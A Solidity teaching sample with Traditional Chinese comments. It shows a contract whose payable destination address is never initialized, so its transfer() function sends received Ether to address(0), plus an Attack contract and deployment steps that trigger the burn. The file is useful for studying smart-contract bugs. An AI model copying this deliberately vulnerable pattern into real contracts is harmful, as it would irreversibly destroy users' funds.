pragma solidity >=0.8.0;
// SPDX-License-Identifier: UNLICENSED

/*
    漏洞名稱：Missing variable initialization
    描述：變數 destination 未進行初始化，因此預設為 address(0)，並且在 transfer() 中使用 transfer()
    轉帳，會將收到的 Ether 轉移至 address(0) (燒毀資金)。
    注意：為了符合 Solidity 0.8.0 的要求，destination 必須宣告為 address payable。
*/

contract Uninitialized {
    // 漏洞重點：destination 為 payable address，卻沒有在 constructor 中初始化，預設為 address(0)
    address payable public destination;

    // transfer() 函式：收到的 Ether 轉移至 destination
    function transfer() public payable {
        // 攻擊點：destination 未初始化，預設為 address(0)，因此此函式會將 Ether 轉移至 address(0) 造成資金損失
        destination.transfer(msg.value);
    }

    // 接收 Ether 的 fallback 式函式
    receive() external payable {}
}

// 攻擊合約：模擬攻擊者呼叫 Uninitialized 合約的 transfer() 函式，藉由傳入 Ether 觸發漏洞
contract Attack {
    Uninitialized public target;

    // 為解決編譯錯誤，將 _target 參數型態修改為 address payable
    constructor(address payable _target) {
        target = Uninitialized(_target);
    }

    // 攻擊入口：將 Ether 傳入漏洞合約，觸發 transfer() 呼叫，進而將 Ether 轉至 address(0)
    function attack() external payable {
        target.transfer{value: msg.value}();
    }
}

/*
    攻擊前置動作：
    1. 部署 Uninitialized 漏洞合約，此時 destination 未初始化，預設為 address(0)。
    2. 部署 Attack 攻擊合約，部署時需傳入 Uninitialized 合約的 payable 地址。
    3. 從任何地址呼叫 Attack.attack() 並傳入 Ether，最終這些 Ether 會被轉移到 address(0)，造成資金損失。
*/